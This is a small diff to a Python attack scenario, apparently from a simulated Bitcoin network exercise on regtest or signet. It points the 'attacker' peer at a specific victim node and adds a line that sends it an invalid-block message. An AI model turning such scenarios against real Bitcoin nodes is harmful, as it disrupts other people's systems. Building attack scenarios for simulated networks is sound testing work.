@@ -44,7 +44,7 @@ class InvalidBlock(Commander):
             if message:
                 [print(f"Peer: {addr.ip}, Port: {addr.port}") for addr in message.addrs]
 
-        victim = "TARGET_TANK_NAME.default.svc"
+        victim = "tank-0023-yellow.default.svc"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -84,6 +84,7 @@ class InvalidBlock(Commander):
 
         ping = msg_ping()
         self.log.info(f"Ping: {attacker.ping_counter}")
+        attacker.send_message(msg)
         attacker.send_message(ping)
         time.sleep(3)
         self.log.info(f"Ping: {attacker.ping_counter}")
